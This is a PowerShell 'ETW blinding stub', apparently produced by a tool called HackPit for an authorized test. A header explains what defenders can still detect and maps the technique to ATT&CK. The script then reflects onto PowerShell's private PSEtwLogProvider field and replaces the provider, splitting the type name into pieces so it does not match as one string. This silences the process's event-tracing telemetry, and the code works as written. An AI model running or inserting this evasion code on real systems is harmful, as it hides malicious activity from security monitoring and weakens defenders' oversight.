# =============================================================================
#  ETW blinding stub (current process only) — generated by HackPit for an
#  AUTHORIZED test.
#
#  This is a MANAGED-REFLECTION stub: it rebinds the provider PowerShell logs
#  its own script blocks and pipelines through. It does NOT patch ntdll and does
#  NOT open a process handle, so the memory-patch telemetry you may expect is
#  not what catches this — and it does not blind sensors that read ETW through
#  their own providers.
#
#  WHAT A DEFENDER STILL SEES (this header is not decoration; it is the point):
#    * THE SCRIPT IS READ BEFORE IT TAKES EFFECT. This content reaches AMSI and
#      script-block logging (PowerShell EventCode 4104, 4103) BEFORE the
#      provider is rebound, and the provider type it reflects onto is what
#      public rules match on. The attempt is already recorded.
#    * THE SILENCE IS THE SIGNAL. Sensor-health and telemetry-gap monitoring
#      alert on a provider going quiet for one process while the rest of the
#      host keeps reporting. On a stack that watches sensor health, this
#      converts a quiet signal into an investigated one.
#    * This is PROCESS-SCOPED. It does not stop kernel callbacks, process
#      creation (Security 4688 / Sysmon 1), the parent-process chain, or any
#      network telemetry.
#
#  TRADEOFF: buys much less than it appears to, is loud on any stack that
#  monitors its own sensors, and cannot un-log the script that performed it.
#
#  ATT&CK: T1685 (Disable or Modify Tools) — upstream revoked both T1562.001
#  and T1562.006 (Indicator Blocking) into it. NOT T1690, which is
#  "Prevent Command History Logging" and covers shell history, not sensors.
#  See the detection footprint returned alongside this artifact.
# =============================================================================

Set-StrictMode -Version Latest

# Rebind the provider THIS PowerShell process logs through, by reflecting onto
# the non-public field that holds it. That is a private implementation detail,
# not a documented surface, so it can disappear in any release. Deliberately no
# opcode patching and no hardcoded offsets: this stub is a starting point for an
# authorized operator, not a portable weapon.
$type = [Ref].Assembly.GetType(
    'System.Management.Automation.Tracing.' + 'PSEtwLog' + 'Provider'
)
if ($null -eq $type) {
    Write-Error 'ETW provider type not resolvable on this host; stub not applied.'
    return
}

$field = $type.GetField(
    'etwProvider',
    [Reflection.BindingFlags]'NonPublic,Static'
)
if ($null -eq $field) {
    Write-Error 'ETW provider field not resolvable on this host; stub not applied.'
    return
}

$provider = $field.GetValue($null)
if ($null -eq $provider) {
    Write-Error 'ETW provider instance is null; nothing to do.'
    return
}

$field.SetValue($null, [System.Diagnostics.Eventing.EventProvider]::new([Guid]::NewGuid()))

Write-Output 'ETW provider rebound for this process. Reminder: the resulting telemetry gap is itself detectable; see the footprint.'
